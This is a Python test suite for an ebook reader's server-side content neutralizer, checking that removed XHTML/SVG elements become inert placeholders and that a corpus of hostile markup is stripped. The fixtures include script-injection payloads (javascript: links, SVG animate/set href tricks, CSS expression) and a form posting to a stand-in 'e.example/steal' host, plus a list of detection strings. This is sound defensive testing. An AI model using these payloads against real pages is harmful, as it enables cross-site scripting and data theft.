# ruff: noqa: E501
"""EF-LEC-005, ENF-SEC-004 (server side of the reader), ADR-0055 « Filtre de contenu »:
xhtml-neutralizer@v2, the common allowlist, and an inert element where an element was removed
(the CFI steps of a stored position stay valid from one release to the next)."""

from __future__ import annotations

import re
from collections.abc import Iterator

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from shelfhold.infrastructure.content_trust import (
    CONTENT_FILTER,
    DERIVED_BY,
    NEUTRALIZER_VERSION,
    NeutralizationError,
    neutralize,
)
from shelfhold.infrastructure.xml import Element, safe_parse_xml
from shelfhold.sdk.testing.corpus.trapped_epubs import find_active_css, find_active_patterns, xhtml

pytestmark = pytest.mark.req("EF-LEC-005", "ENF-SEC-004")

XHTML = "http://www.w3.org/1999/xhtml"
SVG = "http://www.w3.org/2000/svg"
XLINK = "http://www.w3.org/1999/xlink"


def _body(data: bytes) -> Element:
    root = safe_parse_xml(data)
    (body,) = root.findall(f"{{{XHTML}}}body")
    return body


def _local(el: Element) -> str:
    return el.tag.rsplit("}", 1)[-1]


def _walk(el: Element) -> Iterator[Element]:
    yield el
    for child in el:
        yield from _walk(child)


def test_version_is_two_and_the_filter_version_is_exposed_for_the_locator() -> None:
    assert NEUTRALIZER_VERSION == 2
    assert DERIVED_BY == "xhtml-neutralizer@v2"
    assert CONTENT_FILTER == "content-filter@2"  # the `filter` field of the stored locator


# --- inert replacement ---------------------------------------------------------------------------

REMOVED_IN_BODY = {
    "script": "<script>alert(1)</script>",
    "script-src": '<script src="/content/t/x.js"></script>',
    "script-module": '<script type="module" src="/assets/app.js"></script>',
    "iframe": '<iframe src="a.xhtml"></iframe>',
    "iframe-srcdoc": '<iframe srcdoc="&lt;script&gt;1&lt;/script&gt;"></iframe>',
    "frame": '<frame src="a"/>',
    "object": '<object data="a.swf"><p>fallback</p></object>',
    "embed": '<embed src="a.swf"/>',
    "applet": "<applet code='A'></applet>",
    "form": '<form action="/x"><input name="a"/></form>',
    "input": '<input type="text"/>',
    "button": "<button>go</button>",
    "select": "<select><option>a</option></select>",
    "textarea": "<textarea>a</textarea>",
    "meta-refresh": '<meta http-equiv="refresh" content="0;url=https://e.example/"/>',
    "meta-http-equiv": '<meta http-equiv="Content-Security-Policy" content="x"/>',
    "base": '<base href="https://e.example/"/>',
    "link-prefetch": '<link rel="prefetch" href="a.xhtml"/>',
    "link-icon": '<link rel="icon" href="a.png"/>',
    "portal": '<portal src="a"></portal>',
    "math": '<math xmlns="http://www.w3.org/1998/Math/MathML"><maction actiontype="x"><mi>a</mi></maction></math>',
    "math-href": '<math xmlns="http://www.w3.org/1998/Math/MathML" href="javascript:1"><mi>a</mi></math>',
    "video": '<video src="a.mp4"></video>',
    "noscript": "<noscript><img src='https://e.example/p.gif'/></noscript>",
    "template": "<template><script>1</script></template>",
    "empty-style": "<style>@import 'https://e.example/a.css';</style>",
    "img-without-src": '<img src="https://e.example/p.png" alt="a"/>',
    "svg-script": '<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>',
}


@pytest.mark.parametrize("name", sorted(REMOVED_IN_BODY))
def test_removed_element_is_replaced_by_an_inert_one_at_the_same_rank(name: str) -> None:
    """`test_content_filter_preserves_cfi_steps`, server side: `p`, removed, `p` stay three."""
    document = xhtml(f"<p>a</p>{REMOVED_IN_BODY[name]}<p>b</p>")
    children = list(_body(neutralize(document, "xhtml")))
    if name == "svg-script":
        # the svg itself is allowed: its script becomes an inert child, the rank of `svg` is kept
        assert [_local(c) for c in children] == ["p", "svg", "p"]
        svg = children[1]
        assert [_local(c) for c in svg] == ["g"]
        return
    assert [_local(c) for c in children] == ["p", "span", "p"], name
    inert = children[1]
    assert inert.attrib == {} and len(inert) == 0 and (inert.text or "") == ""


def test_the_text_around_a_removed_element_stays_in_two_separate_nodes() -> None:
    body = _body(neutralize(xhtml("<p>one<script>1</script>two</p>"), "xhtml"))
    (p,) = list(body)
    assert p.text == "one" and [_local(c) for c in p] == ["span"] and p[0].tail == "two"


def test_the_content_of_a_removed_element_goes_with_it() -> None:
    out = neutralize(
        xhtml("<object data='a'><p>kept?</p></object><iframe>kept too?</iframe>"), "xhtml"
    )
    assert b"kept" not in out


def test_nested_removal_keeps_every_ancestor_and_sibling_rank() -> None:
    document = xhtml("<div><p>a</p><form><p>x</p></form><section><iframe/><p>b</p></section></div>")
    (div,) = list(_body(neutralize(document, "xhtml")))
    assert [_local(c) for c in div] == ["p", "span", "section"]
    assert [_local(c) for c in div[2]] == ["span", "p"]


@pytest.mark.parametrize(
    ("parent", "inert"),
    [
        ("table", "tr"),
        ("tbody", "tr"),
        ("tr", "td"),
        ("colgroup", "col"),
        ("ul", "span"),
    ],
)
def test_the_inert_element_is_one_the_parent_accepts(parent: str, inert: str) -> None:
    """A `span` in a table would be moved by an HTML parser: the rank would not be the same."""
    wrap = {
        "table": "{}",
        "tbody": "<table><tbody>{}</tbody></table>",
        "tr": "<table><tbody><tr>{}</tr></tbody></table>",
        "colgroup": "<table><colgroup>{}</colgroup></table>",
        "ul": "<ul>{}</ul>",
    }[parent]
    inner = (
        wrap.format("<script>1</script>")
        if parent != "table"
        else "<table><script>1</script></table>"
    )
    out = neutralize(xhtml(inner), "xhtml")
    found = [e for e in _walk(_body(out)) if _local(e) == parent and len(e)]
    assert found, out
    assert _local(found[0][0]) == inert


def test_svg_element_removed_is_replaced_by_an_inert_group() -> None:
    svg = (
        f'<svg xmlns="{SVG}" xmlns:xlink="{XLINK}"><rect width="1" height="1"/>'
        '<set attributeName="href" to="javascript:alert(1)"/><circle r="1"/></svg>'
    ).encode()
    out = neutralize(svg, "svg")
    root = safe_parse_xml(out)
    assert [_local(c) for c in root] == ["rect", "g", "circle"]
    assert find_active_patterns(out) == []


@settings(max_examples=60, deadline=None)
@given(
    st.lists(
        st.sampled_from(
            [
                "<p>a</p>",
                "<h2>t</h2>",
                "<script>1</script>",
                "<form/>",
                "<iframe/>",
                "<object/>",
                "<base href='a'/>",
                "<ul><li>a</li></ul>",
                "<div><script/><b>x</b></div>",
            ]
        ),
        min_size=0,
        max_size=12,
    )
)
def test_neutralizer_preserves_cfi_steps(parts: list[str]) -> None:
    """Whatever mix of kept and removed siblings: as many children out as in, kept ones at the same rank."""
    document = xhtml("".join(parts))
    expected = [re.match(r"<(\w+)", p).group(1) for p in parts]  # type: ignore[union-attr]
    removed = {"script", "form", "iframe", "object", "base"}
    out = [_local(c) for c in _body(neutralize(document, "xhtml"))]
    assert len(out) == len(expected)
    for rank, name in enumerate(expected):
        assert out[rank] == ("span" if name in removed else name)


def test_output_is_stable_when_neutralized_again() -> None:
    """The inert element is on the allowlist: a derivative is a fixed point (it is `clean`)."""
    once = neutralize(xhtml("<p>a</p><script>1</script><form><input/></form><p>b</p>"), "xhtml")
    assert neutralize(once, "xhtml") == once


# --- the hostile corpus of the ADR ---------------------------------------------------------------

HOSTILE_XHTML = {
    "inline-script": "<script>alert(1)</script><p>a</p>",
    "on-handlers": '<p onclick="a()" onmouseover="b()" onerror="c()">a</p><img src="a.png" onerror="x()" alt=""/>',
    "script-src-absolute": '<script src="https://e.example/a.js"></script>',
    "script-src-content-path": '<script src="/content/ticket/x.js"></script>',
    "script-module-spa-asset": '<script type="module" src="/_app/immutable/entry.js"></script>',
    "javascript-link": '<a href="javascript:alert(1)">x</a>',
    "javascript-link-obfuscated": '<a href="java&#10;script:alert(1)">x</a>',
    "data-html-link": '<a href="data:text/html,&lt;script&gt;1&lt;/script&gt;">x</a>',
    "svg-xlink-javascript": f'<svg xmlns="{SVG}" xmlns:xlink="{XLINK}"><a xlink:href="javascript:alert(1)"><text>x</text></a><use xlink:href="javascript:alert(1)"/></svg>',
    "svg-scripted": f'<svg xmlns="{SVG}"><script>alert(1)</script><rect onload="a()" width="1" height="1"/></svg>',
    "svg-set-href": f'<svg xmlns="{SVG}"><a href="#"><set attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>',
    "svg-animate-href": f'<svg xmlns="{SVG}"><a><animate attributeName="href" values="javascript:alert(1)"/><text>x</text></a></svg>',
    "svg-foreign-object": f'<svg xmlns="{SVG}"><foreignObject><body xmlns="{XHTML}"><script>1</script></body></foreignObject></svg>',
    "svg-use-external": f'<svg xmlns="{SVG}" xmlns:xlink="{XLINK}"><use xlink:href="https://e.example/a.svg#x"/></svg>',
    "iframe": '<iframe src="a.xhtml"></iframe>',
    "iframe-srcdoc": '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    "iframe-nested-blob": '<iframe src="blob:https://app.example/1234"></iframe>',
    "object-data": '<object data="a.html" type="text/html"></object>',
    "embed": '<embed src="a.html"/>',
    "form": '<form action="https://e.example/steal" method="post"><input name="a"/><button>go</button></form>',
    "form-attributes": '<p><button formaction="https://e.example/">x</button></p>',
    "meta-refresh": '<meta http-equiv="refresh" content="0;url=https://e.example/"/><p>a</p>',
    "base": '<base href="https://e.example/"/><p>a</p>',
    "link-prefetch": '<link rel="prefetch" href="https://e.example/"/><p>a</p>',
    "mathml-href": '<math xmlns="http://www.w3.org/1998/Math/MathML"><mi href="javascript:alert(1)">x</mi></math>',
    "mathml-annotation": '<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><annotation-xml encoding="text/html"><script>1</script></annotation-xml></semantics></math>',
    "style-import": "<style>@import url('https://e.example/a.css'); p { color: red }</style><p>a</p>",
    "style-remote-url": '<p style="background:url(https://e.example/p.png)">a</p>',
    "style-instance-url": '<p style="background:url(/api/v1/library)">a</p>',
    "style-expression": '<p style="width:expression(alert(1))">a</p>',
    "attribute-srcset-poster-ping": '<img src="a.png" srcset="https://e.example/p.png 2x" alt=""/><a href="a.xhtml" ping="https://e.example/">x</a>',
}


@pytest.mark.parametrize("name", sorted(HOSTILE_XHTML))
def test_content_filter_whitelist_corpus(name: str) -> None:
    """`test_content_filter_whitelist_corpus` (server side): nothing active, nothing remote, comes out."""
    document = xhtml(HOSTILE_XHTML[name])
    try:
        out = neutralize(document, "xhtml")
    except NeutralizationError as refusal:  # a refusal is a valid answer: nothing is served
        assert refusal.code == "content.untrusted_entry"
        return
    assert find_active_patterns(out) == [], out
    assert find_active_css(out) == [], out
    text = out.decode("utf-8")
    for needle in (
        "javascript:",
        "e.example",
        "srcdoc",
        "/content/",
        "/_app/",
        "/api/",
        "<script",
        "http-equiv",
        "<base",
        "<form",
        "<iframe",
        "<object",
        "<embed",
        "formaction",
        " ping=",
        "annotation-xml",
    ):
        assert needle not in text.lower().replace("&#10;", ""), (name, needle)
    assert re.search(r"\son\w+=", text) is None
    # the page is still a page: its paragraph, when there is one, is where it was
    if "<p>a</p>" in HOSTILE_XHTML[name]:
        assert b"<p>a</p>" in out


def test_removed_elements_in_the_head_leave_no_inert_element() -> None:
    """The head is not walked by a reading position: no placeholder there."""
    document = xhtml(
        "<p>a</p>",
        head='<base href="https://e.example/"/><meta http-equiv="refresh" content="1"/><script>1</script>',
    )
    out = neutralize(document, "xhtml")
    head = safe_parse_xml(out).find(f"{{{XHTML}}}head")
    assert head is not None and [_local(c) for c in head] == ["title"]


def test_stylesheet_with_remote_import_and_url_is_cut_rule_by_rule() -> None:
    sheet = b"@import 'https://e.example/a.css'; a { color: red } b { background: url(https://e.example/p.png) } c { background: url(local.png) }"
    out = neutralize(sheet, "css").decode()
    assert "e.example" not in out and "color: red" in out and "local.png" in out


def test_a_lying_manifest_does_not_change_what_the_neutralizer_does_with_a_page() -> None:
    """The neutralizer works on the kind the server chose, never on the media type of the OPF."""
    page = xhtml("<script>1</script><p>a</p>")
    assert neutralize(page, "xhtml") == neutralize(page, "xhtml")
    with pytest.raises(NeutralizationError):
        neutralize(b"<html><body><script>1</script></body></html>", "svg")
